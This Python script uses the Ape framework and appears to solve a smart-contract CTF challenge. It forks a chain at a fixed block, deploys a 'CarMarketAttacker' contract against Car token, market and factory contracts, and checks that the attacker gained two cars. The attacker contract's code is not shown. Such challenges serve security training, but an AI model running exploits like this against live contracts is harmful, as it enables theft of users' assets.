from ape import accounts, project, Contract
from .utils.helper import fork, get_block
import time

CAR_TOKEN_CONTRACT = "0x66408824A99FF61ae2e032E3c7a461DED1a6718E"
CAR_MARKET_CONTRACT = "0x07AbFccEd19Aeb5148C284Cd39a9ff2Ac835960A"
CAR_FACTORY_CONTRACT = "0x012f0c715725683A5405B596f4F55D4AD3046854"
DELAY = 5  # for rate limit
BLOCK = 7247740


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contracts ---\n")
    token = Contract(CAR_TOKEN_CONTRACT)
    time.sleep(DELAY)
    market = Contract(CAR_MARKET_CONTRACT)
    time.sleep(DELAY)
    factory = Contract(CAR_FACTORY_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.CarMarketAttacker.deploy(
        token.address,
        market.address,
        factory.address,
        sender=attacker,
        # max_fee="100 gwei",
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: We successfully purchased two cars ---\n")

    assert market.getCarCount(attacker_contract.address) == 2

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
